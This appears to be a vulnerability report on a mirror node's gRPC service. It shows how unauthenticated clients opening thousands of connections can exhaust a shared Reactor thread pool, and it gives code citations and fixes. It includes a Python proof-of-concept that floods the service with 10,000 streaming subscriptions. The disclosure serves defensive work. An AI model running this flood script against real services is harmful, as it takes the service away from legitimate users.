### Title
Unbounded gRPC Subscription Fan-Out Exhausts Global `boundedElastic` Scheduler, Causing Complete Denial of Service

### Summary
`PollingTopicListener.listen()` creates a new independent cold publisher per subscription, each scheduling repeating DB-poll tasks on the global `Schedulers.boundedElastic()` singleton. Because `maxConcurrentCallsPerConnection = 5` limits only per-connection concurrency with no cap on total connections, an unauthenticated attacker can open thousands of TCP connections and flood the shared thread pool. Once the pool and its task queue are exhausted, `RejectedExecutionException` propagates to all subscribers, causing a complete denial of service for every legitimate client.

### Finding Description

**Exact code path:**

`PollingTopicListener` (POLL mode) — [1](#0-0)  declares a field `private final Scheduler scheduler = Schedulers.boundedElastic()`. In Reactor, `Schedulers.boundedElastic()` returns the **global singleton** bounded-elastic scheduler shared across the entire JVM process.

Each call to `listen()` creates a new cold publisher: [2](#0-1)  — `Flux.defer(() -> poll(context)).delaySubscription(interval, scheduler).repeatWhen(RepeatSpec.times(Long.MAX_VALUE)...withScheduler(scheduler))`. Every active subscription schedules a repeating task on the global pool every 500 ms (default `interval`).

`SharedTopicListener` (REDIS and SHARED_POLL modes) — [3](#0-2)  calls `.publishOn(Schedulers.boundedElastic(), false, listenerProperties.getPrefetch())` **per subscriber**. Each subscriber holds a dedicated worker thread from the same global pool for message delivery.

`TopicMessageServiceImpl.subscribeTopic()` — [4](#0-3)  adds a per-subscription safety-check flux also scheduled on `Schedulers.boundedElastic()`.

`PollingTopicMessageRetriever` — [5](#0-4)  also uses `Schedulers.boundedElastic()` for historical retrieval, competing for the same pool.

**Root cause:** All four components share the same global `boundedElastic` pool. Reactor's default pool size is `10 × availableProcessors` threads (e.g., 80 on an 8-core host) with a per-thread task queue of 100,000. When the queue fills, Reactor throws `RejectedExecutionException`, which terminates every active subscription.

**Why the existing check fails:**

The only server-side guard is `maxConcurrentCallsPerConnection = 5`: [6](#0-5)  applied in [7](#0-6) . This limits concurrent RPC calls **per TCP connection**, not the total number of connections. There is no `maxConnections`, no IP-based rate limit, and no authentication requirement anywhere in the gRPC server configuration. An attacker simply opens more connections.

### Impact Explanation

With N attacker-controlled TCP connections × 5 calls each = 5N concurrent subscriptions. At N = 2,000 connections (trivially achievable from a single host), 10,000 subscriptions are active. In POLL mode each subscription fires a DB-poll task every 500 ms, generating 20,000 scheduler tasks/second against a pool with ~80 threads. The task queue saturates within seconds. `RejectedExecutionException` propagates through the reactive chain, terminating **all** subscriptions — attacker and legitimate alike. The gRPC service becomes completely unavailable. Because the pool is shared with the retriever and safety-check logic, historical message retrieval also fails simultaneously, constituting a full network partition between the gRPC service and its DB/Redis backends from the perspective of every subscriber.

### Likelihood Explanation

No authentication or API key is required to call `subscribeTopic`. The gRPC port (5600) is publicly exposed per the Helm chart: [8](#0-7) . Opening thousands of TCP connections is a standard low-skill attack achievable with a single machine and a trivial script using any gRPC client library. The attack is repeatable: after the service recovers, the attacker reconnects. The `maxRatePerEndpoint: 250` GCP backend policy: [9](#0-8)  is a request-rate limit at the load-balancer level and does not bound the number of long-lived streaming connections already established.

### Recommendation

1. **Enforce a global connection limit** via `NettyServerBuilder.maxConnectionAge()` / `maxConnectionIdle()` and a hard `maxConnections` cap in `GrpcConfiguration`.
2. **Per-IP connection rate limiting** at the Netty or gateway layer before requests reach the application.
3. **Isolate scheduler pools**: replace `Schedulers.boundedElastic()` with named, bounded `Schedulers.newBoundedElastic(threadCap, queueSize, "listener-pool")` instances in `PollingTopicListener`, `SharedTopicListener`, and `PollingTopicMessageRetriever` so that subscriber overload cannot starve retrieval or safety-check logic.
4. **Cap total active subscriptions** with an `AtomicInteger` counter in `TopicMessageServiceImpl.subscribeTopic()` that rejects new subscriptions above a configurable threshold.
5. **Require authentication/authorization** (e.g., mTLS or a bearer token) for the `subscribeTopic` RPC to raise the attacker's cost.

### Proof of Concept

```python
# Requires: pip install grpcio grpcio-tools
import grpc
import threading
import time
# Assume compiled proto stubs are available as consensus_pb2 / consensus_pb2_grpc

TARGET = "mirror-node-grpc-host:5600"
CONNECTIONS = 2000   # each opens 5 streams = 10,000 total subscriptions
CALLS_PER_CONN = 5

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_pb2_grpc.ConsensusServiceStub(channel)
    streams = []
    for _ in range(CALLS_PER_CONN):
        req = consensus_pb2.ConsensusTopicQuery(
            topicID=consensus_pb2.TopicID(topicNum=1)
        )
        # Open a long-lived streaming subscription; no auth needed
        stream = stub.subscribeTopic(req)
        streams.append(stream)
    # Keep connections alive
    time.sleep(300)

threads = [threading.Thread(target=flood, args=(i,)) for i in range(CONNECTIONS)]
for t in threads:
    t.start()
# Within seconds the boundedElastic queue saturates;
# all legitimate subscribers receive RejectedExecutionException / UNAVAILABLE.
```

**Expected result:** Within seconds of reaching ~80+ active POLL subscriptions the `boundedElastic` thread pool saturates. At 10,000 subscriptions the task queue fills and Reactor begins rejecting tasks with `RejectedExecutionException`, terminating all active subscriptions and rendering the gRPC service completely unavailable to legitimate users.

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/PollingTopicListener.java (L31-31)
```java
    private final Scheduler scheduler = Schedulers.boundedElastic();
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/PollingTopicListener.java (L38-44)
```java
        return Flux.defer(() -> poll(context))
                .delaySubscription(interval, scheduler)
                .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
                        .jitter(0.1)
                        .withFixedDelay(interval)
                        .withScheduler(scheduler))
                .name(METRIC)
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/SharedTopicListener.java (L25-25)
```java
                .publishOn(Schedulers.boundedElastic(), false, listenerProperties.getPrefetch());
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L67-70)
```java
        Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
                .filter(_ -> !topicContext.isComplete())
                .flatMapMany(_ -> missingMessages(topicContext, null))
                .subscribeOn(Schedulers.boundedElastic());
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L41-41)
```java
        scheduler = Schedulers.boundedElastic();
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L14-14)
```java
    private int maxConcurrentCallsPerConnection = 5;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L33-33)
```java
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
```

**File:** charts/hedera-mirror-grpc/values.yaml (L69-69)
```yaml
      maxRatePerEndpoint: 250  # Requires a change to HPA to take effect
```

**File:** charts/hedera-mirror-grpc/values.yaml (L86-88)
```yaml
          port: 5600
      matches:
        - method:
```
